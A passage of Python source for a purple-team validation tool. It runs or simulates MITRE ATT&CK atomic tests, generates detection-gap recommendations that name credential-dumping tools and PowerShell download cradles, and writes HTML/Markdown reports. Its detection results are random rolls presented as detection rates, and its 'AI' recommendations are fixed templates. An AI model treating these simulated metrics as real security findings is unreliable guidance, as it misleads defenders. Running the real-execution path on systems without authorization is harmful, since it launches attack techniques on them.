            "T1082": "Host Name:                 WORKSTATION\nOS Name:                   Microsoft Windows 10 Pro\nOS Version:                10.0.19044 N/A Build 19044\nSystem Type:               x64-based PC",
            "T1016": "Windows IP Configuration\nEthernet adapter Ethernet:\n   IPv4 Address. . . . : 192.168.1.100\n   Subnet Mask . . . . : 255.255.255.0\n   Default Gateway . . : 192.168.1.1",
        }
        
        return outputs.get(test.technique_id, f"[SIMULATED] {test.name} executed successfully\nCommand: {test.command[:50]}...")
    
    def _real_execution(self, test: AtomicTest) -> Tuple[str, str]:
        """Actually execute the test (use with extreme caution)"""
        if test.executor == "powershell":
            cmd = ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", test.command]
        elif test.executor == "cmd":
            cmd = ["cmd.exe", "/c", test.command]
        else:
            cmd = test.command.split()
        
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=self.timeout,
            shell=False
        )
        
        return proc.stdout, proc.stderr
    
    def _analyze_detection(self, test: AtomicTest, result: TestResult) -> DetectionResult:
        """Simulate detection analysis based on test characteristics"""
        # Detection probabilities based on technique visibility
        high_visibility_techniques = ["T1003", "T1486", "T1490", "T1070", "T1562"]
        medium_visibility_techniques = ["T1059", "T1547", "T1053", "T1021"]
        
        base_detection_rate = 0.3
        
        if any(t in test.technique_id for t in high_visibility_techniques):
            base_detection_rate = 0.85
        elif any(t in test.technique_id for t in medium_visibility_techniques):
            base_detection_rate = 0.55
        
        if test.elevation_required:
            base_detection_rate += 0.1
        
        roll = random.random()
        
        if roll < base_detection_rate:
            return DetectionResult.DETECTED
        elif roll < base_detection_rate + 0.15:
            return DetectionResult.PARTIAL
        else:
            return DetectionResult.EVADED
    
    def _generate_artifacts(self, test: AtomicTest) -> List[Dict]:
        """Generate simulated artifacts from test execution"""
        artifacts = []
        
        if "powershell" in test.executor:
            artifacts.append({
                "type": "process",
                "name": "powershell.exe",
                "pid": random.randint(1000, 65535),
                "command_line": test.command[:100]
            })
        
        if "registry" in test.command.lower() or "HKCU" in test.command or "HKLM" in test.command:
            artifacts.append({
                "type": "registry",
                "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "action": "modified"
            })
        
        if any(x in test.command.lower() for x in ["copy", "download", "write"]):
            artifacts.append({
                "type": "file",
                "path": "C:\\Windows\\Temp\\artifact.tmp",
                "action": "created"
            })
        
        return artifacts
    
    def _simulate_edr_alerts(self, test: AtomicTest, detection: DetectionResult) -> List[Dict]:
        """Simulate EDR alerts based on detection result"""
        if detection == DetectionResult.EVADED:
            return []
        
        alerts = []
        
        if detection in [DetectionResult.DETECTED, DetectionResult.PARTIAL]:
            alert = {
                "alert_id": str(uuid.uuid4())[:8],
                "timestamp": datetime.now().isoformat(),
                "technique": test.technique_id,
                "severity": random.choice(["high", "critical"]) if detection == DetectionResult.DETECTED else "medium",
                "title": f"Suspicious {test.technique_name} Activity Detected",
                "description": f"EDR detected execution of {test.name}",
                "mitre_mapping": test.technique_id,
            }
            alerts.append(alert)
        
        return alerts

# ============================================================================
# AI RECOMMENDATION ENGINE
# ============================================================================

class AIRecommendationEngine:
    """AI-powered recommendation engine for blue team improvements"""
    
    RECOMMENDATION_TEMPLATES = {
        "T1003": [
            "Enable Credential Guard to protect LSASS memory from unauthorized access",
            "Deploy LSA Protection (RunAsPPL) to prevent credential dumping",
            "Implement SIEM alerts for LSASS access attempts from non-system processes",
            "Configure EDR to block known credential dumping tools (Mimikatz, ProcDump)",
        ],
        "T1059.001": [
            "Enable PowerShell Script Block Logging (Event ID 4104)",
            "Implement Constrained Language Mode for non-admin users",
            "Deploy AMSI-aware endpoint protection",
            "Create detection rules for encoded PowerShell commands (-enc, -e)",
            "Block PowerShell download cradles via application whitelisting",
        ],
        "T1547": [
            "Monitor registry Run keys for unauthorized modifications",
            "Implement change detection on Startup folders",
            "Create alerts for new scheduled tasks created by non-admin users",
            "Deploy application whitelisting to prevent unauthorized persistence",
        ],
        "T1548.002": [
            "Keep Windows updated to patch known UAC bypass techniques",
            "Set UAC to 'Always Notify' level",
            "Monitor for registry modifications to shell\\open\\command keys",
            "Implement detection for auto-elevated executables being launched unexpectedly",
        ],
        "T1562": [
            "Enable tamper protection on all endpoints",
            "Alert on attempts to disable security tools",
            "Implement canary files/processes to detect defense evasion",
            "Deploy redundant security controls that cannot be disabled simultaneously",
        ],
        "T1070": [
            "Forward all logs to centralized SIEM immediately",
            "Alert on event log clearing attempts (Event ID 1102)",
            "Implement immutable log storage",
            "Deploy additional monitoring for Event Log service changes",
        ],
        "T1021": [
            "Implement network segmentation to limit lateral movement",
            "Deploy multi-factor authentication for administrative access",
            "Monitor for unusual SMB/RDP connections between workstations",
            "Disable unnecessary remote access protocols",
        ],
        "T1486": [
            "Deploy anti-ransomware features in EDR",
            "Implement backup verification and air-gapped backups",
            "Monitor for mass file encryption activity",
            "Create honeypot files to detect ransomware early",
        ],
    }
    
    GENERAL_RECOMMENDATIONS = [
        "Implement a robust security baseline across all endpoints",
        "Conduct regular purple team exercises to validate controls",
        "Establish 24/7 SOC monitoring capabilities",
        "Deploy threat hunting program to proactively identify threats",
        "Implement zero-trust network architecture",
        "Regular penetration testing and vulnerability assessments",
        "Employee security awareness training program",
        "Incident response plan with regular tabletop exercises",
    ]
    
    @classmethod
    def generate_recommendations(cls, test_results: List[TestResult], detection_gaps: List[DetectionGap]) -> List[str]:
        """Generate AI-powered recommendations based on test results"""
        recommendations = []
        seen_techniques = set()
        
        # Analyze gaps and generate specific recommendations
        for gap in detection_gaps:
            tech_base = gap.technique_id.split(".")[0]
            if tech_base not in seen_techniques:
                seen_techniques.add(tech_base)
                if tech_base in cls.RECOMMENDATION_TEMPLATES:
                    recommendations.extend(cls.RECOMMENDATION_TEMPLATES[tech_base])
        
        # Add recommendations for evaded tests
        for result in test_results:
            if result.detection_result == DetectionResult.EVADED:
                tech_base = result.technique_id.split(".")[0]
                if tech_base not in seen_techniques and tech_base in cls.RECOMMENDATION_TEMPLATES:
                    seen_techniques.add(tech_base)
                    recommendations.extend(cls.RECOMMENDATION_TEMPLATES[tech_base][:2])
        
        # Add general recommendations if needed
        if len(recommendations) < 5:
            recommendations.extend(random.sample(cls.GENERAL_RECOMMENDATIONS, min(3, len(cls.GENERAL_RECOMMENDATIONS))))
        
        # Deduplicate and prioritize
        recommendations = list(dict.fromkeys(recommendations))
        
        return recommendations[:15]  # Return top 15 recommendations
    
    @classmethod
    def analyze_detection_gaps(cls, test_results: List[TestResult]) -> List[DetectionGap]:
        """Identify detection gaps from test results"""
        gaps = []
        
        for result in test_results:
            if result.detection_result in [DetectionResult.EVADED, DetectionResult.PARTIAL]:
                severity = Severity.HIGH if result.detection_result == DetectionResult.EVADED else Severity.MEDIUM
                
                # Get technique-specific remediation
                tech_base = result.technique_id.split(".")[0]
                remediations = cls.RECOMMENDATION_TEMPLATES.get(tech_base, [])[:3]
                if not remediations:
                    remediations = ["Review and enhance detection rules for this technique"]
                
                gap = DetectionGap(
                    gap_id=f"GAP-{str(uuid.uuid4())[:8]}",
                    technique_id=result.technique_id,
                    technique_name=result.technique_name,
                    tactic=result.tactic,
                    severity=severity,
                    description=f"{'No detection' if result.detection_result == DetectionResult.EVADED else 'Partial detection'} for {result.technique_name}",
                    recommendation=remediations[0] if remediations else "Enhance detection capabilities",
                    affected_systems=["All Windows endpoints"],
                    remediation_steps=remediations,
                    references=[
                        f"https://attack.mitre.org/techniques/{result.technique_id}/",
                        "https://github.com/redcanaryco/atomic-red-team"
                    ]
                )
                gaps.append(gap)
        
        return gaps

# ============================================================================
# REPORT GENERATOR
# ============================================================================

class ReportGenerator:
    """Generate comprehensive validation reports"""
    
    def __init__(self, output_dir: str = "/tmp/purple_reports"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def generate_executive_summary(self, report: ValidationReport) -> str:
        """Generate executive summary text"""
        summary = f"""
PURPLE TEAM VALIDATION - EXECUTIVE SUMMARY
==========================================

Campaign: {report.campaign_name}
Date: {report.start_time.strftime('%Y-%m-%d %H:%M')} - {report.end_time.strftime('%H:%M') if report.end_time else 'In Progress'}
Environment: {report.target_environment}

KEY METRICS:
• Total Tests Executed: {report.tests_executed} / {report.total_tests}
• Detection Rate: {report.detection_rate:.1%}
• Evasion Rate: {report.evasion_rate:.1%}
• Critical Gaps Identified: {len([g for g in report.detection_gaps if g.severity == Severity.CRITICAL])}
• High-Risk Gaps: {len([g for g in report.detection_gaps if g.severity == Severity.HIGH])}

SECURITY POSTURE ASSESSMENT:
{'🟢 STRONG' if report.detection_rate > 0.8 else '🟡 MODERATE' if report.detection_rate > 0.5 else '🔴 NEEDS IMPROVEMENT'}
Your security controls detected {report.detection_rate:.0%} of simulated attacks.

TOP RECOMMENDATIONS:
"""
        for i, rec in enumerate(report.ai_recommendations[:5], 1):
            summary += f"{i}. {rec}\n"
        
        return summary
    
    def generate_html_report(self, report: ValidationReport) -> str:
        """Generate interactive HTML report"""
        
        # Generate MITRE coverage data
        mitre_data = self._generate_mitre_coverage_data(report)
        
        # Generate timeline data
        timeline_data = self._generate_timeline_data(report)
        
        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Purple Team Validation Report - {report.campaign_name}</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            color: #e0e0e0;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        header {{
            background: linear-gradient(90deg, #7b2cbf, #9d4edd);
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            box-shadow: 0 10px 40px rgba(123, 44, 191, 0.3);
        }}
        
        header h1 {{
            font-size: 2.5em;
            color: white;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }}
        
        header .subtitle {{
            color: rgba(255,255,255,0.8);
            font-size: 1.2em;
            margin-top: 10px;
        }}
        
        .metrics-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        
        .metric-card {{
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            transition: transform 0.3s, box-shadow 0.3s;
        }}
        
        .metric-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
        }}
        
        .metric-value {{
            font-size: 3em;
            font-weight: bold;
            background: linear-gradient(90deg, #00d4ff, #7b2cbf);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        
        .metric-label {{
            color: #aaa;
            font-size: 1.1em;
            margin-top: 10px;
        }}
        
        .detection-rate {{
            font-size: 4em;
        }}
        
        .rate-good {{ color: #00ff88; -webkit-text-fill-color: #00ff88; }}
        .rate-moderate {{ color: #ffaa00; -webkit-text-fill-color: #ffaa00; }}
        .rate-poor {{ color: #ff4444; -webkit-text-fill-color: #ff4444; }}
        
        .section {{
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            border: 1px solid rgba(255,255,255,0.1);
        }}
        
        .section h2 {{
            color: #00d4ff;
            margin-bottom: 20px;
            font-size: 1.5em;
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        
        .section h2::before {{
            content: '▶';
            color: #7b2cbf;
        }}
        
        .chart-container {{
            background: rgba(0,0,0,0.2);
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }}
        
        table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }}
        
        th, td {{
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }}
        
        th {{
            background: rgba(123, 44, 191, 0.3);
            color: #00d4ff;
            font-weight: 600;
        }}
        
        tr:hover {{
            background: rgba(255,255,255,0.05);
        }}
        
        .status-detected {{
            color: #00ff88;
            font-weight: bold;
        }}
        
        .status-partial {{
            color: #ffaa00;
            font-weight: bold;
        }}
        
        .status-evaded {{
            color: #ff4444;
            font-weight: bold;
        }}
        
        .severity-critical {{
            background: #ff4444;
            color: white;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.85em;
        }}
        
        .severity-high {{
            background: #ff8800;
            color: white;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.85em;
        }}
        
        .severity-medium {{
            background: #ffcc00;
            color: #333;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.85em;
        }}
        
        .recommendation-list {{
            list-style: none;
        }}
        
        .recommendation-list li {{
            padding: 15px;
            margin: 10px 0;
            background: rgba(0, 212, 255, 0.1);
            border-left: 4px solid #00d4ff;
            border-radius: 0 10px 10px 0;
        }}
        
        .recommendation-list li:hover {{
            background: rgba(0, 212, 255, 0.2);
        }}
        
        .mitre-heatmap {{
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 10px;
            margin-top: 20px;
        }}
        
        .tactic-box {{
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.2s;
        }}
        
        .tactic-box:hover {{
            transform: scale(1.05);
        }}
        
        .tactic-name {{
            font-weight: bold;
            margin-bottom: 5px;
        }}
        
        .tactic-stats {{
            font-size: 0.9em;
            opacity: 0.8;
        }}
        
        .coverage-good {{ background: rgba(0, 255, 136, 0.3); border: 1px solid #00ff88; }}
        .coverage-partial {{ background: rgba(255, 170, 0, 0.3); border: 1px solid #ffaa00; }}
        .coverage-poor {{ background: rgba(255, 68, 68, 0.3); border: 1px solid #ff4444; }}
        
        .timeline {{
            position: relative;
            padding: 20px 0;
        }}
        
        .timeline::before {{
            content: '';
            position: absolute;
            left: 20px;
            top: 0;
            bottom: 0;
            width: 2px;
            background: linear-gradient(180deg, #7b2cbf, #00d4ff);
        }}
        
        .timeline-item {{
            position: relative;
            padding-left: 60px;
            margin-bottom: 20px;
        }}
        
        .timeline-item::before {{
            content: '';
            position: absolute;
            left: 12px;
            top: 5px;
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background: #7b2cbf;
            border: 3px solid #00d4ff;
        }}
        
        .timeline-time {{
            color: #00d4ff;
            font-size: 0.9em;
            margin-bottom: 5px;
        }}
        
        .timeline-content {{
            background: rgba(255,255,255,0.05);
            padding: 15px;
            border-radius: 10px;
        }}
        
        footer {{
            text-align: center;
            padding: 30px;
            color: #666;
            border-top: 1px solid rgba(255,255,255,0.1);
            margin-top: 30px;
        }}
        
        @media print {{
            body {{
                background: white;
                color: #333;
            }}
            .metric-value {{
                color: #333;
                -webkit-text-fill-color: #333;
            }}
            .section {{
                break-inside: avoid;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🛡️ Purple Team Validation Report</h1>
            <div class="subtitle">{report.campaign_name} | {report.start_time.strftime('%B %d, %Y')}</div>
        </header>
        
        <!-- Key Metrics -->
        <div class="metrics-grid">
            <div class="metric-card">
                <div class="metric-value detection-rate {'rate-good' if report.detection_rate > 0.7 else 'rate-moderate' if report.detection_rate > 0.4 else 'rate-poor'}">{report.detection_rate:.0%}</div>
                <div class="metric-label">Detection Rate</div>
            </div>
            <div class="metric-card">
                <div class="metric-value">{report.tests_executed}</div>
                <div class="metric-label">Tests Executed</div>
            </div>
            <div class="metric-card">
                <div class="metric-value">{len([r for r in report.test_results if r.detection_result == DetectionResult.DETECTED])}</div>
                <div class="metric-label">Attacks Detected</div>
            </div>
            <div class="metric-card">
                <div class="metric-value">{len([r for r in report.test_results if r.detection_result == DetectionResult.EVADED])}</div>
                <div class="metric-label">Attacks Evaded</div>
            </div>
            <div class="metric-card">
                <div class="metric-value">{len(report.detection_gaps)}</div>
                <div class="metric-label">Detection Gaps</div>
            </div>
            <div class="metric-card">
                <div class="metric-value">{len([g for g in report.detection_gaps if g.severity in [Severity.CRITICAL, Severity.HIGH]])}</div>
                <div class="metric-label">Critical/High Gaps</div>
            </div>
        </div>
        
        <!-- Detection Results Chart -->
        <div class="section">
            <h2>Detection Results Overview</h2>
            <div class="chart-container">
                <canvas id="detectionChart"></canvas>
            </div>
        </div>
        
        <!-- MITRE Coverage -->
        <div class="section">
            <h2>MITRE ATT&CK Coverage</h2>
            <div class="mitre-heatmap">
                {self._generate_mitre_html(report)}
            </div>
            <div class="chart-container" style="margin-top: 30px;">
                <canvas id="tacticChart"></canvas>
            </div>
        </div>
        
        <!-- Test Results Table -->
        <div class="section">
            <h2>Test Execution Results</h2>
            <table>
                <thead>
                    <tr>
                        <th>Technique</th>
                        <th>Test Name</th>
                        <th>Tactic</th>
                        <th>Detection</th>
                        <th>Duration</th>
                    </tr>
                </thead>
                <tbody>
                    {self._generate_results_table(report)}
                </tbody>
            </table>
        </div>
        
        <!-- Detection Gaps -->
        <div class="section">
            <h2>Detection Gaps Analysis</h2>
            <table>
                <thead>
                    <tr>
                        <th>Technique</th>
                        <th>Description</th>
                        <th>Severity</th>
                        <th>Recommendation</th>
                    </tr>
                </thead>
                <tbody>
                    {self._generate_gaps_table(report)}
                </tbody>
            </table>
        </div>
        
        <!-- AI Recommendations -->
        <div class="section">
            <h2>AI-Powered Recommendations</h2>
            <ul class="recommendation-list">
                {self._generate_recommendations_html(report)}
            </ul>
        </div>
        
        <!-- Timeline -->
        <div class="section">
            <h2>Attack Timeline</h2>
            <div class="timeline">
                {self._generate_timeline_html(report)}
            </div>
        </div>
        
        <footer>
            <p>Generated by Purple Team Validator | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Confidential - For Authorized Personnel Only</p>
        </footer>
    </div>
    
    <script>
        // Detection Results Chart
        const detectionCtx = document.getElementById('detectionChart').getContext('2d');
        new Chart(detectionCtx, {{
            type: 'doughnut',
            data: {{
                labels: ['Detected', 'Partial', 'Evaded'],
                datasets: [{{
                    data: [
                        {len([r for r in report.test_results if r.detection_result == DetectionResult.DETECTED])},
                        {len([r for r in report.test_results if r.detection_result == DetectionResult.PARTIAL])},
                        {len([r for r in report.test_results if r.detection_result == DetectionResult.EVADED])}
                    ],
                    backgroundColor: ['#00ff88', '#ffaa00', '#ff4444'],
                    borderWidth: 0
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{
                        position: 'bottom',
                        labels: {{ color: '#e0e0e0' }}
                    }}
                }}
            }}
        }});
        
        // Tactic Coverage Chart
        const tacticCtx = document.getElementById('tacticChart').getContext('2d');
        new Chart(tacticCtx, {{
            type: 'bar',
            data: {{
                labels: {json.dumps([MITRE_TACTICS[t]['name'] for t in report.mitre_coverage.keys()])},
                datasets: [{{
                    label: 'Detection Rate',
                    data: {json.dumps([report.mitre_coverage[t].get('detection_rate', 0) * 100 for t in report.mitre_coverage.keys()])},
                    backgroundColor: 'rgba(0, 212, 255, 0.7)',
                    borderColor: '#00d4ff',
                    borderWidth: 1
                }}]
            }},
            options: {{
                responsive: true,
                scales: {{
                    y: {{
                        beginAtZero: true,
                        max: 100,
                        ticks: {{ color: '#e0e0e0' }},
                        grid: {{ color: 'rgba(255,255,255,0.1)' }}
                    }},
                    x: {{
                        ticks: {{ color: '#e0e0e0' }},
                        grid: {{ color: 'rgba(255,255,255,0.1)' }}
                    }}
                }},
                plugins: {{
                    legend: {{
                        labels: {{ color: '#e0e0e0' }}
                    }}
                }}
            }}
        }});
    </script>
</body>
</html>'''
        
        return html
    
    def _generate_mitre_html(self, report: ValidationReport) -> str:
        """Generate MITRE ATT&CK heatmap HTML"""
        html = ""
        for tactic_id, data in report.mitre_coverage.items():
            tactic_info = MITRE_TACTICS.get(tactic_id, {"name": tactic_id, "color": "#666"})
            rate = data.get('detection_rate', 0)
            coverage_class = "coverage-good" if rate > 0.7 else "coverage-partial" if rate > 0.4 else "coverage-poor"
            
            html += f'''
            <div class="tactic-box {coverage_class}">
                <div class="tactic-name">{tactic_info['name']}</div>
                <div class="tactic-stats">{rate:.0%} detected</div>
                <div class="tactic-stats">{data.get('tests', 0)} tests</div>
            </div>
            '''
        return html
    
    def _generate_results_table(self, report: ValidationReport) -> str:
        """Generate test results table HTML"""
        html = ""
        for result in report.test_results[:20]:  # Limit to 20 for readability
            status_class = f"status-{result.detection_result.value}"
            tactic_name = MITRE_TACTICS.get(result.tactic, {}).get('name', result.tactic)
            
            html += f'''
            <tr>
                <td><strong>{result.technique_id}</strong></td>
                <td>{result.test_name[:50]}...</td>
                <td>{tactic_name}</td>
                <td class="{status_class}">{result.detection_result.value.upper()}</td>
                <td>{result.duration_ms}ms</td>
            </tr>
            '''
        return html
    
    def _generate_gaps_table(self, report: ValidationReport) -> str:
        """Generate detection gaps table HTML"""
        html = ""
        for gap in report.detection_gaps[:10]:
            severity_class = f"severity-{gap.severity.value}"
            
            html += f'''
            <tr>
                <td><strong>{gap.technique_id}</strong><br><small>{gap.technique_name}</small></td>
                <td>{gap.description}</td>
                <td><span class="{severity_class}">{gap.severity.value.upper()}</span></td>
                <td>{gap.recommendation}</td>
            </tr>
            '''
        return html
    
    def _generate_recommendations_html(self, report: ValidationReport) -> str:
        """Generate recommendations list HTML"""
        html = ""
        for i, rec in enumerate(report.ai_recommendations, 1):
            html += f'<li><strong>#{i}</strong> {rec}</li>\n'
        return html
    
    def _generate_timeline_html(self, report: ValidationReport) -> str:
        """Generate attack timeline HTML"""
        html = ""
        for result in report.test_results[:10]:
            html += f'''
            <div class="timeline-item">
                <div class="timeline-time">{result.start_time.strftime('%H:%M:%S')}</div>
                <div class="timeline-content">
                    <strong>{result.technique_id}</strong> - {result.test_name}
                    <br><small class="status-{result.detection_result.value}">{result.detection_result.value.upper()}</small>
                </div>
            </div>
            '''
        return html
    
    def _generate_mitre_coverage_data(self, report: ValidationReport) -> Dict:
        """Generate MITRE coverage data structure"""
        coverage = {}
        for result in report.test_results:
            tactic = result.tactic
            if tactic not in coverage:
                coverage[tactic] = {'tests': 0, 'detected': 0}
            coverage[tactic]['tests'] += 1
            if result.detection_result == DetectionResult.DETECTED:
                coverage[tactic]['detected'] += 1
        
        for tactic in coverage:
            coverage[tactic]['detection_rate'] = coverage[tactic]['detected'] / coverage[tactic]['tests'] if coverage[tactic]['tests'] > 0 else 0
        
        return coverage
    
    def _generate_timeline_data(self, report: ValidationReport) -> List[Dict]:
        """Generate timeline data for visualization"""
        return [
            {
                'time': r.start_time.isoformat(),
                'technique': r.technique_id,
                'name': r.test_name,
                'result': r.detection_result.value
            }
            for r in report.test_results
        ]
    
    def save_report(self, report: ValidationReport, formats: List[ReportFormat]) -> Dict[str, str]:
        """Save report in specified formats"""
        saved_files = {}
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        for fmt in formats:
            filename = f"purple_team_report_{timestamp}"
            
            if fmt == ReportFormat.HTML:
                filepath = self.output_dir / f"{filename}.html"
                with open(filepath, 'w') as f:
                    f.write(self.generate_html_report(report))
                saved_files['html'] = str(filepath)
                
            elif fmt == ReportFormat.JSON:
                filepath = self.output_dir / f"{filename}.json"
                report_dict = {
                    'report_id': report.report_id,
                    'campaign_name': report.campaign_name,
                    'start_time': report.start_time.isoformat(),
                    'end_time': report.end_time.isoformat() if report.end_time else None,
                    'target_environment': report.target_environment,
                    'detection_rate': report.detection_rate,
                    'evasion_rate': report.evasion_rate,
                    'total_tests': report.total_tests,
                    'tests_executed': report.tests_executed,
                    'mitre_coverage': report.mitre_coverage,
                    'ai_recommendations': report.ai_recommendations,
                    'test_results': [
                        {
                            'test_id': r.test_id,
                            'technique_id': r.technique_id,
                            'detection_result': r.detection_result.value,
                            'duration_ms': r.duration_ms
                        }
                        for r in report.test_results
                    ],
                    'detection_gaps': [
                        {
                            'gap_id': g.gap_id,
                            'technique_id': g.technique_id,
                            'severity': g.severity.value,
                            'recommendation': g.recommendation
                        }
                        for g in report.detection_gaps
                    ]
                }
                with open(filepath, 'w') as f:
                    json.dump(report_dict, f, indent=2)
                saved_files['json'] = str(filepath)
                
            elif fmt == ReportFormat.MARKDOWN:
                filepath = self.output_dir / f"{filename}.md"
                md_content = self._generate_markdown_report(report)
                with open(filepath, 'w') as f:
                    f.write(md_content)
                saved_files['markdown'] = str(filepath)
                
            elif fmt == ReportFormat.EXECUTIVE:
                filepath = self.output_dir / f"{filename}_executive.txt"
                with open(filepath, 'w') as f:
                    f.write(self.generate_executive_summary(report))
                saved_files['executive'] = str(filepath)
        
        return saved_files
    
    def _generate_markdown_report(self, report: ValidationReport) -> str:
        """Generate Markdown format report"""
        md = f"""# Purple Team Validation Report

## Campaign: {report.campaign_name}

**Date:** {report.start_time.strftime('%Y-%m-%d %H:%M')}  
**Environment:** {report.target_environment}  
**EDR Systems:** {', '.join(report.edr_vendors)}

---

## Executive Summary

| Metric | Value |
|--------|-------|
| Total Tests | {report.total_tests} |
| Tests Executed | {report.tests_executed} |
| Detection Rate | {report.detection_rate:.1%} |
| Evasion Rate | {report.evasion_rate:.1%} |
| Detection Gaps | {len(report.detection_gaps)} |

### Security Posture: {'✅ Strong' if report.detection_rate > 0.8 else '⚠️ Moderate' if report.detection_rate > 0.5 else '❌ Needs Improvement'}

---

## Test Results

| Technique | Test | Detection | Duration |
|-----------|------|-----------|----------|
"""
        for r in report.test_results[:20]:
            md += f"| {r.technique_id} | {r.test_name[:40]}... | {r.detection_result.value} | {r.duration_ms}ms |\n"
        
        md += f"""

---

## Detection Gaps

| Technique | Severity | Recommendation |
|-----------|----------|----------------|
"""
        for g in report.detection_gaps:
            md += f"| {g.technique_id} | {g.severity.value.upper()} | {g.recommendation[:50]}... |\n"
        
        md += f"""

---

## AI Recommendations

"""
        for i, rec in enumerate(report.ai_recommendations, 1):
            md += f"{i}. {rec}\n"
        
        md += f"""

---

*Generated by Purple Team Validator - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}*
"""
        return md

# ============================================================================
# MAIN VALIDATION API
# ============================================================================

class PurpleTeamValidator:
    """Main Purple Team Validation orchestrator"""
    
    def __init__(self):
        AtomicTestLibrary.initialize()
        self.executor = TestExecutor(safe_mode=True)
        self.report_generator = ReportGenerator()
        self.current_campaign: Optional[ValidationReport] = None
        self.campaigns: Dict[str, ValidationReport] = {}
        self._lock = threading.Lock()
    
    def create_campaign(
        self,
        name: str,
        target_environment: str = "Production",
        edr_vendors: List[str] = None,
        tactics: List[str] = None,
        techniques: List[str] = None
    ) -> str:
        """Create a new validation campaign"""
        campaign_id = str(uuid.uuid4())[:8]
        
        # Determine which tests to include
        all_tests = AtomicTestLibrary.get_all_tests()
        selected_tests = []
        
        if techniques:
            for tech in techniques:
                selected_tests.extend(AtomicTestLibrary.get_tests_by_technique(tech))
        elif tactics:
            for tactic in tactics:
                selected_tests.extend(AtomicTestLibrary.get_tests_by_tactic(tactic))
        else:
            selected_tests = all_tests
        
        report = ValidationReport(
            report_id=campaign_id,
            campaign_name=name,
            start_time=datetime.now(),
            end_time=None,
            target_environment=target_environment,
            edr_vendors=edr_vendors or [EDRVendor.GENERIC.value],
            total_tests=len(selected_tests),
            tests_executed=0,
            tests_passed=0,
            tests_failed=0,
            detection_rate=0.0,
            evasion_rate=0.0,
            test_results=[],
            detection_gaps=[],
            mitre_coverage={},
            ai_recommendations=[],
            executive_summary="",
            technical_findings=[]
        )
        
        self.campaigns[campaign_id] = report
        self.current_campaign = report
        
        logger.info(f"Created campaign '{name}' with {len(selected_tests)} tests")
        return campaign_id
    
    def run_campaign(
        self,
        campaign_id: str = None,
        simulate: bool = True,
        parallel: bool = False,
        max_workers: int = 4
    ) -> ValidationReport:
        """Run a validation campaign"""
        campaign = self.campaigns.get(campaign_id) if campaign_id else self.current_campaign
        if not campaign:
            raise ValueError("No campaign found")
        
        # Get tests based on campaign settings
        tests = AtomicTestLibrary.get_all_tests()
        
        logger.info(f"Starting campaign '{campaign.campaign_name}' with {len(tests)} tests")
        
        if parallel:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(self.executor.execute_test, test, simulate): test for test in tests}
                for future in as_completed(futures):
                    result = future.result()
                    campaign.test_results.append(result)
                    campaign.tests_executed += 1
        else:
            for test in tests:
                result = self.executor.execute_test(test, simulate)
                campaign.test_results.append(result)
                campaign.tests_executed += 1
        
        # Calculate metrics
        campaign.end_time = datetime.now()
        detected = len([r for r in campaign.test_results if r.detection_result == DetectionResult.DETECTED])
        evaded = len([r for r in campaign.test_results if r.detection_result == DetectionResult.EVADED])
        
        campaign.detection_rate = detected / campaign.tests_executed if campaign.tests_executed > 0 else 0
        campaign.evasion_rate = evaded / campaign.tests_executed if campaign.tests_executed > 0 else 0
        campaign.tests_passed = detected
        campaign.tests_failed = evaded
        
        # Generate MITRE coverage
        campaign.mitre_coverage = self.report_generator._generate_mitre_coverage_data(campaign)
        
        # Analyze gaps
        campaign.detection_gaps = AIRecommendationEngine.analyze_detection_gaps(campaign.test_results)
        
        # Generate AI recommendations
        campaign.ai_recommendations = AIRecommendationEngine.generate_recommendations(
            campaign.test_results, 
            campaign.detection_gaps
        )
        
        # Generate executive summary
        campaign.executive_summary = self.report_generator.generate_executive_summary(campaign)
        
        logger.info(f"Campaign completed: {campaign.detection_rate:.1%} detection rate")
        return campaign
    
    def run_quick_assessment(self, techniques: List[str] = None) -> Dict:
        """Run a quick assessment with selected techniques"""
        campaign_id = self.create_campaign(
            name="Quick Assessment",
            techniques=techniques
        )
        
        report = self.run_campaign(campaign_id, simulate=True)
        
        return {
            'campaign_id': campaign_id,
